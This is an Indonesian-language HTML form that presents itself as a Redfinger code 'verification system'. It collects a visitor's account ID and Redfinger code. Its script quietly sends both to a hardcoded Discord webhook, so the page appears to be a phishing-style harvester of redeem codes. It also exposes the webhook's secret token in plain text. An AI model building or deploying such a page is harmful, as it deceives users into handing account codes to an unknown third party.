<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redfinger - Submit Kode</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 40px;
            width: 100%;
            max-width: 500px;
            backdrop-filter: blur(10px);
            animation: slideIn 0.5s ease-out;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo h1 {
            color: #667eea;
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 10px;
        }

        .logo p {
            color: #666;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            color: #333;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 14px 18px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #f8f9fa;
        }

        input:focus {
            outline: none;
            border-color: #667eea;
            background: white;
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
        }

        input::placeholder {
            color: #aaa;
        }

        .btn-submit {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
        }

        .btn-submit:active {
            transform: translateY(0);
        }

        .btn-submit:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        .message {
            margin-top: 20px;
            padding: 14px;
            border-radius: 10px;
            font-size: 14px;
            text-align: center;
            display: none;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .message.success {
            background: #d4edda;
            color: #155724;
            border: 2px solid #c3e6cb;
        }

        .message.error {
            background: #f8d7da;
            color: #721c24;
            border: 2px solid #f5c6cb;
        }

        .info-text {
            color: #666;
            font-size: 13px;
            margin-top: 6px;
            font-style: italic;
        }

        /* Mobile Responsive */
        @media (max-width: 480px) {
            .container {
                padding: 30px 25px;
            }

            .logo h1 {
                font-size: 28px;
            }

            input {
                padding: 12px 16px;
                font-size: 15px;
            }

            .btn-submit {
                padding: 14px;
                font-size: 15px;
            }
        }

        /* Loading Animation */
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-left: 10px;
            vertical-align: middle;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>üéÆ Redfinger</h1>
            <p>Submit Kode Verifikasi</p>
        </div>

        <form id="codeForm">
            <div class="form-group">
                <label for="userId">ID Akun Anda</label>
                <input 
                    type="number" 
                    id="userId" 
                    name="userId" 
                    placeholder="Masukkan ID akun" 
                    required
                    min="1"
                >
                <p class="info-text">Masukkan ID akun berupa angka</p>
            </div>

            <div class="form-group">
                <label for="redfingerCode">Kode Redfinger Anda</label>
                <input 
                    type="text" 
                    id="redfingerCode" 
                    name="redfingerCode" 
                    placeholder="Contoh: 99WP-KM66-W93L" 
                    required
                    pattern="[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}"
                    maxlength="14"
                >
                <p class="info-text">Format: XXXX-XXXX-XXXX (huruf besar & angka)</p>
            </div>

            <button type="submit" class="btn-submit" id="submitBtn">
                Kirim Kode
            </button>
        </form>

        <div class="message" id="message"></div>
    </div>

    <script>
        const form = document.getElementById('codeForm');
        const submitBtn = document.getElementById('submitBtn');
        const message = document.getElementById('message');
        const codeInput = document.getElementById('redfingerCode');

        // Auto format kode dengan dash
        codeInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^A-Z0-9]/gi, '').toUpperCase();
            let formattedValue = '';
            
            for (let i = 0; i < value.length && i < 12; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += '-';
                }
                formattedValue += value[i];
            }
            
            e.target.value = formattedValue;
        });

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const userId = document.getElementById('userId').value;
            const redfingerCode = document.getElementById('redfingerCode').value;
            
            // Disable button dan tampilkan loading
            submitBtn.disabled = true;
            submitBtn.innerHTML = 'Mengirim... <span class="spinner"></span>';
            message.style.display = 'none';
            
            // Data yang akan dikirim ke Discord
            const webhookData = {
                embeds: [{
                    title: "üìù Kode Redfinger Baru",
                    color: 5814783,
                    fields: [
                        {
                            name: "üë§ ID Akun",
                            value: userId,
                            inline: true
                        },
                        {
                            name: "üîë Kode Redfinger",
                            value: `\`${redfingerCode}\``,
                            inline: true
                        }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "Redfinger Verification System"
                    }
                }]
            };
            
            try {
                const response = await fetch('https://discord.com/api/webhooks/1445316905920364565/24sHAyS_iWUdXzLXL7LZhf5Izv-AdhOWk2s5tVdRD9IwCKci4YgvSh270Zw0AQrgq2HV', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(webhookData)
                });
                
                if (response.ok || response.status === 204) {
                    message.className = 'message success';
                    message.textContent = '‚úÖ Kode berhasil dikirim! Terima kasih.';
                    message.style.display = 'block';
                    form.reset();
                } else {
                    throw new Error('Gagal mengirim data');
                }
            } catch (error) {
                message.className = 'message error';
                message.textContent = '‚ùå Terjadi kesalahan. Silakan coba lagi.';
                message.style.display = 'block';
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Kirim Kode';
            }
        });
    </script>
</body>
                                       </html>
